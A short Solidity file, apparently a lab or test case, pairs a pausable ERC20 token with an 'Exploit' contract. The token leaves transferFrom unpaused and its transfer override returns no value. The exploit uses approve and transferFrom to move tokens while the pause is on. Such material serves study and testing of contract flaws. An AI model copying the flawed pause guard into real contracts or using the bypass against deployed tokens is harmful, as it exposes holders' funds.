pragma solidity 0.8.19;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/security/Pausable.sol";

contract IPermissionedToken is ERC20, Ownable, Pausable {
    constructor(uint256 supply) ERC20("PermissionedToken", "PT") {
        _mint(msg.sender, supply);
    }

    function transfer(address recipient, uint256 amount) public override whenNotPaused returns (bool) {
        super.transfer(recipient, amount);
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }
}


contract Exploit {
    address target;
    constructor(address tokenAddress) {
        target = tokenAddress;
    }

    function attack() external {
        IPermissionedToken ip = IPermissionedToken(target);
        ip.approve(address(this), 50e18);
        ip.transferFrom(address(this), address(1), 50e18);
    }
}
